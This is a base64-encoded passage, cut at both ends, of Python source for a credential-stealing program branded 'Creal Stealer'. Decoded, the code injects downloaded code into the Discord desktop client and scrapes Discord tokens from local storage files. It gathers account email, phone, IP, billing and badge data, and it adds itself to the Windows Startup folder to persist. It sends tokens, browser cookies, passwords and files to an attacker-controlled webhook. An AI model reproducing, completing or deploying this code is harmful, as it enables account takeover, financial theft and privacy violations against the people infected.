ZXMgaW4gb3Mud2FsayhzdWJzdWJkaXIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICdkaXNjb3JkX2Rlc2t0b3BfY29yZScgaW4gc3Vic3Vic3ViZGlyOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBzdWJzdWJmaWxlczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGZpbGUgPT0gJ2luZGV4LmpzJzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4oc3Vic3Vic3ViZGlyLCBmaWxlKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmpfY29udGVudCA9IHJlcXVlc3RzLmdldChpbmpfdXJsKS50ZXh0CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlual9jb250ZW50ID0gaW5qX2NvbnRlbnQucmVwbGFjZSgiJVdFQkhPT0slIiwgdGVsbmV0KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAidyIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGluZGV4X2ZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZGV4X2ZpbGUud3JpdGUoaW5qX2NvbnRlbnQpCiAgICBpbmpfZGlzY29yZCgpCgogICAgZGVmIEczdEI0ZGczMShmbGFncyk6CiAgICAgICAgaWYgZmxhZ3MgPT0gMDogcmV0dXJuICcnCgogICAgICAgIE93bjNkQjNkZzRzID0gJycKICAgICAgICBiNGRnM0xpc3QgPSAgWwogICAgICAgICAgICB7Ik5hbWUiOiAnRWFybHlfVmVyaWZpZWRfQm90X0RldmVsb3BlcicsICdWYWx1ZSc6IDEzMTA3MiwgJ0Vtb2ppJzogIjw6ZGV2ZWxvcGVyOjg3NDc1MDgwODQ3MjgyNTk4Nj4gIn0sCiAgICAgICAgICAgIHsiTmFtZSI6ICdCdWdfSHVudGVyX0xldmVsXzInLCAnVmFsdWUnOiAxNjM4NCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzI6ODc0NzUwODA4NDMwODc0NjY0PiAifSwKICAgICAgICAgICAgeyJOYW1lIjogJ0Vhcmx5X1N1cHBvcnRlcicsICdWYWx1ZSc6IDUxMiwgJ0Vtb2ppJzogIjw6ZWFybHlfc3VwcG9ydGVyOjg3NDc1MDgwODQxNDExMzgyMz4gIn0sCiAgICAgICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CYWxhbmNlJywgJ1ZhbHVlJzogMjU2LCAnRW1vamknOiAiPDpiYWxhbmNlOjg3NDc1MDgwODI2NzI5MjY4Mz4gIn0sCiAgICAgICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmlsbGlhbmNlJywgJ1ZhbHVlJzogMTI4LCAnRW1vamknOiAiPDpicmlsbGlhbmNlOjg3NDc1MDgwODMzODYwODE5OT4gIn0sCiAgICAgICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmF2ZXJ5JywgJ1ZhbHVlJzogNjQsICdFbW9qaSc6ICI8OmJyYXZlcnk6ODc0NzUwODA4Mzg4OTUyMDc1PiAifSwKICAgICAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMScsICdWYWx1ZSc6IDgsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8xOjg3NDc1MDgwODQyNjY5MjY1OD4gIn0sCiAgICAgICAgICAgIHsiTmFtZSI6ICdIeXBlU3F1YWRfRXZlbnRzJywgJ1ZhbHVlJzogNCwgJ0Vtb2ppJzogIjw6aHlwZXNxdWFkX2V2ZW50czo4NzQ3NTA4MDg1OTQ0NzcwNTY+ICJ9LAogICAgICAgICAgICB7Ik5hbWUiOiAnUGFydG5lcmVkX1NlcnZlcl9Pd25lcicsICdWYWx1ZSc6IDIsJ0Vtb2ppJzogIjw6cGFydG5lcjo4NzQ3NTA4MDg2NzgzNTQ5NjQ+ICJ9LAogICAgICAgICAgICB7Ik5hbWUiOiAnRGlzY29yZF9FbXBsb3llZScsICdWYWx1ZSc6IDEsICdFbW9qaSc6ICI8OnN0YWZmOjg3NDc1MDgwODcyODY2NjE1Mj4gIn0KICAgICAgICBdCiAgICAgICAgZm9yIGI0ZGczIGluIGI0ZGczTGlzdDoKICAgICAgICAgICAgaWYgZmxhZ3MgLy8gYjRkZzNbIlZhbHVlIl0gIT0gMDoKICAgICAgICAgICAgICAgIE93bjNkQjNkZzRzICs9IGI0ZGczWyJFbW9qaSJdCiAgICAgICAgICAgICAgICBmbGFncyA9IGZsYWdzICUgYjRkZzNbIlZhbHVlIl0KCiAgICAgICAgcmV0dXJuIE93bjNkQjNkZzRzCgogICAgZGVmIEczdFQwazRuMW5mOSh0MGszbik6CiAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0MGszbiwKICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICAgICAgfQoKICAgICAgICB1czNyanMwbiA9IGpzb24ubG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpKS5yZWFkKCkuZGVjb2RlKCkpCiAgICAgICAgdXMzcm40bTEgPSB1czNyanMwblsidXNlcm5hbWUiXQogICAgICAgIGhhc2h0YWcgPSB1czNyanMwblsiZGlzY3JpbWluYXRvciJdCiAgICAgICAgZW0zMWwgPSB1czNyanMwblsiZW1haWwiXQogICAgICAgIGlkZCA9IHVzM3JqczBuWyJpZCJdCiAgICAgICAgcGZwID0gdXMzcmpzMG5bImF2YXRhciJdCiAgICAgICAgZmxhZ3MgPSB1czNyanMwblsicHVibGljX2ZsYWdzIl0KICAgICAgICBuMXRyMCA9ICIiCiAgICAgICAgcGgwbjMgPSAiIgoKICAgICAgICBpZiAicHJlbWl1bV90eXBlIiBpbiB1czNyanMwbjogCiAgICAgICAgICAgIG5pdHJvdCA9IHVzM3JqczBuWyJwcmVtaXVtX3R5cGUiXQogICAgICAgICAgICBpZiBuaXRyb3QgPT0gMToKICAgICAgICAgICAgICAgIG4xdHIwID0gIjxhOkRFX0JhZGdlTml0cm86ODY1MjQyNDMzNjkyNzYyMTIyPiIKICAgICAgICAgICAgZWxpZiBuaXRyb3QgPT0gMjoKICAgICAgICAgICAgICAgIG4xdHIwID0gIjxhOkRFX0JhZGdlTml0cm86ODY1MjQyNDMzNjkyNzYyMTIyPjxhOmF1dHJfYm9vc3QxOjEwMzg3MjQzMjE3NzE3ODYyNDA+IgogICAgICAgIGlmICJwaDBuMyIgaW4gdXMzcmpzMG46IHBoMG4zID0gZid7dXMzcmpzMG5bInBoMG4zIl19JwoKICAgICAgICByZXR1cm4gdXMzcm40bTEsIGhhc2h0YWcsIGVtMzFsLCBpZGQsIHBmcCwgZmxhZ3MsIG4xdHIwLCBwaDBuMwoKICAgIGRlZiBjaDFja1Q0azFuKHQwazNuKToKICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHQwazNuLAogICAgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgICAgICB9CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycykpCiAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICByZXR1cm4gRmFsc2UKCiAgICBpZiBnZXRhdHRyKHN5cywgJ2Zyb3plbicsIEZhbHNlKToKICAgICAgICBjdXJyZW50RmlsZVBhdGggPSBvcy5wYXRoLmRpcm5hbWUoc3lzLmV4ZWN1dGFibGUpCiAgICBlbHNlOgogICAgICAgIGN1cnJlbnRGaWxlUGF0aCA9IG9zLnBhdGguZGlybmFtZShvcy5wYXRoLmFic3BhdGgoX19maWxlX18pKQoKICAgIGZpbGVOYW1lID0gb3MucGF0aC5iYXNlbmFtZShzeXMuYXJndlswXSkKICAgIGZpbGVQYXRoID0gb3MucGF0aC5qb2luKGN1cnJlbnRGaWxlUGF0aCwgZmlsZU5hbWUpCgogICAgc3RhcnR1cEZvbGRlclBhdGggPSBvcy5wYXRoLmpvaW4ob3MucGF0aC5leHBhbmR1c2VyKCd+JyksICdBcHBEYXRhJywgJ1JvYW1pbmcnLCAnTWljcm9zb2Z0JywgJ1dpbmRvd3MnLCAnU3RhcnQgTWVudScsICdQcm9ncmFtcycsICdTdGFydHVwJykKICAgIHN0YXJ0dXBGaWxlUGF0aCA9IG9zLnBhdGguam9pbihzdGFydHVwRm9sZGVyUGF0aCwgZmlsZU5hbWUpCgogICAgaWYgb3MucGF0aC5hYnNwYXRoKGZpbGVQYXRoKS5sb3dlcigpICE9IG9zLnBhdGguYWJzcGF0aChzdGFydHVwRmlsZVBhdGgpLmxvd2VyKCk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVQYXRoLCAncmInKSBhcyBzcmNfZmlsZSwgb3BlbihzdGFydHVwRmlsZVBhdGgsICd3YicpIGFzIGRzdF9maWxlOgogICAgICAgICAgICBzaHV0aWwuY29weWZpbGVvYmooc3JjX2ZpbGUsIGRzdF9maWxlKQoKCiAgICBkZWYgdXBsMDVkVDRrMzEodDBrM24sIHBhdGgpOgogICAgICAgIGdsb2JhbCB0ZWxuZXQKICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgICAgICB9CiAgICAgICAgdXMzcm40bTEsIGhhc2h0YWcsIGVtMzFsLCBpZGQsIHBmcCwgZmxhZ3MsIG4xdHIwLCBwaDBuMyA9IEczdFQwazRuMW5mOSh0MGszbikKCiAgICAgICAgaWYgcGZwID09IE5vbmU6IAogICAgICAgICAgICBwZnAgPSAiaHR0cHM6Ly9pLmltZ3VyLmNvbS9TMFpxcDRSLmpwZyIKICAgICAgICBlbHNlOgogICAgICAgICAgICBwZnAgPSBmImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMve2lkZH0ve3BmcH0iCgogICAgICAgIGIxbGwxbmcgPSBHM3RiMWxsMW5nKHQwazNuKQogICAgICAgIGI0ZGczID0gRzN0QjRkZzMxKGZsYWdzKQogICAgICAgIGZyaWVuZHMgPSBHM3RVSFFGcjEzbmRTKHQwazNuKQogICAgICAgIGlmIGZyaWVuZHMgPT0gJyc6IGZyaWVuZHMgPSAiYGBgTm8gUmFyZSBGcmllbmRzYGBgIgogICAgICAgIGlmIG5vdCBiMWxsMW5nOgogICAgICAgICAgICBiNGRnMywgcGgwbjMsIGIxbGwxbmcgPSAi8J+UkiIsICLwn5SSIiwgIvCflJIiCiAgICAgICAgaWYgbjF0cjAgPT0gJycgYW5kIGI0ZGczID09ICcnOiBuMXRyMCA9ICJgYGBOb25lYGBgIgoKICAgICAgICBkYXRhID0gewogICAgICAgICAgICAiY29udGVudCI6IGYne2dsb2JhbEluZm8oKX0gfCBge3BhdGh9YCcsCiAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAiY29sb3IiOiAyODk1NjY3LAogICAgICAgICAgICAgICAgImZpZWxkcyI6IFsKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjxhOmh5cGVyTk9QUEVSUzo4MjgzNjk1MTgxOTkzMDgzODg+IFRva2VuOiIsCiAgICAgICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYiYGBge3QwazNufWBgYCIsCiAgICAgICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjw6bWFpbDo3NTAzOTM4NzA1MDc5NjY0ODY+IEVtYWlsOiIsCiAgICAgICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYiYGBge2VtMzFsfWBgYCIsCiAgICAgICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjxhOjE2ODlfUmluZ2luZ19QaG9uZTo3NTUyMTk0MTcwNzU0MTcwODg+IFBob25lOiIsCiAgICAgICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYiYGBge3BoMG4zfWBgYCIsCiAgICAgICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjw6bWNfZWFydGg6NTg5NjMwMzk2NDc2NTU1MjY0PiBJUDoiLAogICAgICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImBgYHtnM3QxcCgpfWBgYCIsCiAgICAgICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjw6d29venlmYWNlOjg3NDIyMDg0MzUyODQ4NjkyMz4gQmFkZ2VzOiIsCiAgICAgICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie24xdHIwfXtiNGRnM30iLAogICAgICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI8YTo0Mzk0X2NjX2NyZWRpdGNhcmRfY2FydGFvX2Y0YmloeTo3NTUyMTgyOTY4MDE5ODQ1NTM+IEJpbGxpbmc6IiwKICAgICAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7YjFsbDFuZ30iLAogICAgICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI8YTptYXZpa2lybWl6aTo4NTMyMzgzNzI1OTE1OTk2MTc+IEhRIEZyaWVuZHM6IiwKICAgICAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7ZnJpZW5kc30iLAogICAgICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogRmFsc2UKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICJhdXRob3IiOiB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiBmInt1czNybjRtMX0je2hhc2h0YWd9ICh7aWRkfSkiLAogICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6IGYie3BmcH0iCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgInRleHQiOiAiQ3JlYWwgU3RlYWxlciIsCiAgICAgICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vaS5pbWd1ci5jb20vUzBacXA0Ui5qcGciCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICJ0aHVtYm5haWwiOiB7CiAgICAgICAgICAgICAgICAgICAgInVybCI6IGYie3BmcH0iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAogICAgICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2kuaW1ndXIuY29tL1MwWnFwNFIuanBnIiwKICAgICAgICAgICAgInVzZXJuYW1lIjogIkNyZWFsIFN0ZWFsZXIiLAogICAgICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgICAgICB9CiAgICAgICAgTDA0ZHVybDFiKHRlbG5ldCwgZGF0YT1qc29uLmR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCgogICAgI2hlcnNleSBzb24gZGVmYSA6KAogICAgZGVmIFI0ZjBybTN0KGxpc3R0KToKICAgICAgICBlID0gcmUuZmluZGFsbCgiKFx3K1thLXpdKSIsbGlzdHQpCiAgICAgICAgd2hpbGUgImh0dHBzIiBpbiBlOiBlLnJlbW92ZSgiaHR0cHMiKQogICAgICAgIHdoaWxlICJjb20iIGluIGU6IGUucmVtb3ZlKCJjb20iKQogICAgICAgIHdoaWxlICJuZXQiIGluIGU6IGUucmVtb3ZlKCJuZXQiKQogICAgICAgIHJldHVybiBsaXN0KHNldChlKSkKCiAgICBkZWYgdXBsb2FkKG5hbWUsIGxpbmspOgogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgICAgIH0KCiAgICAgICAgaWYgbmFtZSA9PSAiY3Jjb29rIjoKICAgICAgICAgICAgcmIgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBjb29raVdvcmRzKQogICAgICAgICAgICBpZiBsZW4ocmIpID4gMTAwMDogCiAgICAgICAgICAgICAgICBycnJyciA9IFI0ZjBybTN0KHN0cihjb29raVdvcmRzKSkKICAgICAgICAgICAgICAgIHJiID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gcnJycnIpCiAgICAgICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICAgICAiY29udGVudCI6IGYie2dsb2JhbEluZm8oKX0iLAogICAgICAgICAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICJ0aXRsZSI6ICJDcmVhbCB8IENvb2tpZXMgU3RlYWxlciIsCiAgICAgICAgICAgICAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6IGYiPDphcG9sbG9uZGVsaXJtaXM6MTAxMjM3MDE4MDg0NTg4MzQ5Mz46ICoqQWNjb3VudHM6Kipcblxue3JifVxuXG4qKkRhdGE6Kipcbjw6Y29va2llc190bG06ODE2NjE5MDYzNjE4NTY4MjM0PiDigKIgKip7Q29va2lDb3VudH0qKiBDb29raWVzIEZvdW5kXG48YTpDSF9JY29uQXJyb3dSaWdodDo3MTU1ODUzMjAxNzg5NDE5OTM+IOKAoiBbQ3JlYWxDb29raWVzLnR4dF0oe2xpbmt9KSIsCiAgICAgICAgICAgICAgICAgICAgICAgICJjb2xvciI6IDI4OTU2NjcsCiAgICAgICAgICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJDcmVhbCBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2kuaW1ndXIuY29tL1MwWnFwNFIuanBnIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICJ1c2VybmFtZSI6ICJDcmVhbCBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwNjg5MTYyMjEzNTQ5ODM0MjcvMTA3NDI2NTAxNDU2MDYyMDU1NC9lNmZkMzE2ZmIzNTQ0ZjI4MTEzNjFhMzkyYWQ3M2U2NS5qcGciLAogICAgICAgICAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgTDA0ZHVybDFiKHRlbG5ldCwgZGF0YT1qc29uLmR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICBpZiBuYW1lID09ICJjcnBhc3N3IjoKICAgICAgICAgICAgcmEgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBwYXN3V29yZHMpCiAgICAgICAgICAgIGlmIGxlbihyYSkgPiAxMDAwOiAKICAgICAgICAgICAgICAgIHJyciA9IFI0ZjBybTN0KHN0cihwYXN3V29yZHMpKQogICAgICAgICAgICAgICAgcmEgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBycnIpCgogICAgICAgICAgICBkYXRhID0gewogICAgICAgICAgICAgICAgImNvbnRlbnQiOiBmIntnbG9iYWxJbmZvKCl9IiwKICAgICAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAidGl0bGUiOiAiQ3JlYWwgfCBQYXNzd29yZCBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogZiI8OmFwb2xsb25kZWxpcm1pczoxMDEyMzcwMTgwODQ1ODgzNDkzPjogKipBY2NvdW50cyoqOlxue3JhfVxuXG4qKkRhdGE6KipcbjxhOmhpcmFfa2FzYWFuYWh0YXJpOjg4Njk0Mjg1Njk2OTg3NTQ3Nj4g4oCiICoqe1A0c3N3Q291bnR9KiogUGFzc3dvcmRzIEZvdW5kXG48YTpDSF9JY29uQXJyb3dSaWdodDo3MTU1ODUzMjAxNzg5NDE5OTM+IOKAoiBbQ3JlYWxQYXNzd29yZC50eHRdKHtsaW5rfSkiLAogICAgICAgICAgICAgICAgICAgICAgICAiY29sb3IiOiAyODk1NjY3LAogICAgICAgICAgICAgICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgICAgICAgICAgICAgInRleHQiOiAiQ3JlYWwgU3RlYWxlciIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9pLmltZ3VyLmNvbS9TMFpxcDRSLmpwZyIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgICAgICAidXNlcm5hbWUiOiAiQ3JlYWwiLAogICAgICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9pLmltZ3VyLmNvbS9TMFpxcDRSLmpwZyIsCiAgICAgICAgICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBMMDRkdXJsMWIodGVsbmV0LCBkYXRhPWpzb24uZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIGlmIG5hbWUgPT0gImtpd2kiOgogICAgICAgICAgICBkYXRhID0gewogICAgICAgICAgICAgICAgImNvbnRlbnQiOiBmIntnbG9iYWxJbmZvKCl9IiwKICAgICAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJjb2xvciI6IDI4OTU2NjcsCiAgICAgICAgICAgICAgICAgICAgImZpZWxkcyI6IFsKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICJJbnRlcmVzdGluZyBmaWxlcyBmb3VuZCBvbiB1c2VyIFBDOiIsCiAgICAgICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGxpbmsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgICAgICAgICAgImF1dGhvciI6IHsKICAgICAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiQ3JlYWwgfCBGaWxlIFN0ZWFsZXIiCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJDcmVhbCBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vaS5pbWd1ci5jb20vUzBacXA0Ui5qcGciCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgICAgICAidXNlcm5hbWUiOiAiQ3JlYWwgU3RlYWxlciIsCiAgICAgICAgICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2kuaW1ndXIuY29tL1MwWnFwNFIuanBnIiwKICAgICAgICAgICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIEwwNGR1cmwxYih0ZWxuZXQsIGRhdGE9anNvbi5kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICByZXR1cm4KCgoKCiAgICAjIGRlZiB1cGxvYWQobmFtZSwgdGs9JycpOgogICAgIyAgICAgaGVhZGVycyA9IHsKICAgICMgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgIyAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgIyAgICAgfQoKICAgICMgICAgICMgciA9IHJlcXVlc3RzLnBvc3QoaG9vaywgZmlsZXM9ZmlsZXMpCiAgICAjICAgICBMb2FkUmVxdWVzdHMoIlBPU1QiLCBob29rLCBmaWxlcz1maWxlcykKICAgICAgICAKCgoKCiAgICBkZWYgd3IxdGVmMHJmMWwzKGRhdGEsIG5hbWUpOgogICAgICAgIHBhdGggPSBvcy5nZXRlbnYoIlRFTVAiKSArIGYiXGNye25hbWV9LnR4dCIKICAgICAgICB3aXRoIG9wZW4ocGF0aCwgbW9kZT0ndycsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoZiI8LS1DcmVhbCBTVEVBTEVSIEJFU1QgLS0+XG5cbiIpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGRhdGE6CiAgICAgICAgICAgICAgICBpZiBsaW5lWzBdICE9ICcnOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZiJ7bGluZX1cbiIpCgogICAgVDBrM25zID0gJycKICAgIGRlZiBnZXRUMGszbihwYXRoLCBhcmcpOgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCgogICAgICAgIHBhdGggKz0gYXJnCiAgICAgICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICAgICAgaWYgZmlsZS5lbmRzd2l0aCgiLmxvZyIpIG9yIGZpbGUuZW5kc3dpdGgoIi5sZGIiKSAgIDoKICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmIntwYXRofVxce2ZpbGV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyNSwxMTB9IiwgciJtZmFcLltcdy1dezgwLDk1fSIpOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdDBrM24gaW4gcmUuZmluZGFsbChyZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnbG9iYWwgVDBrM25zCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBjaDFja1Q0azFuKHQwazNuKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdDBrM24gaW4gVDBrM25zOgogICAgIC